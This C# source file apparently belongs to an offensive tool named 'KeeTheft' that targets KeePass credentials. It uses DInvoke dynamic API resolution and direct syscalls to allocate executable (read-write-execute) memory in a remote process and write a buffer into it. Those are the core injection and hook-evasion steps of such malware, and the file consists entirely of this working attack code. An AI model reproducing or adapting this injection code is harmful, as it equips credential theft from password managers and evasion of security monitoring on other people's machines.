using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace KeeTheft
{
    class Win32
    {
        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        public static bool CloseHandle(IntPtr hObject)
        {
            object[] parameters = { hObject };
            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(Delegates.CloseHandle), ref parameters);
        }

        public static IntPtr AllocateRemoteBuffer(IntPtr hProcess, byte[] Buffer)
        {
            var remoteBufferAddr = new IntPtr();
            var regionSize = (IntPtr)Buffer.Length;

            if (Syscalls.NtAllocateVirtualMemory(hProcess, ref remoteBufferAddr, IntPtr.Zero, ref regionSize, DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE, DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE) != 0)
                throw new Exception("Error: Could not allocate memory for buffer");

            var buf = Marshal.AllocHGlobal(Buffer.Length);
            Marshal.Copy(Buffer, 0, buf, Buffer.Length);

            uint numBytes = 0;
            if (Syscalls.NtWriteVirtualMemory(hProcess, remoteBufferAddr, buf, (uint)Buffer.Length, ref numBytes) != 0)
                throw new Exception("Error: Could not write buffer to remote process");

            Marshal.FreeHGlobal(buf);

            return remoteBufferAddr;
        }
    }
}
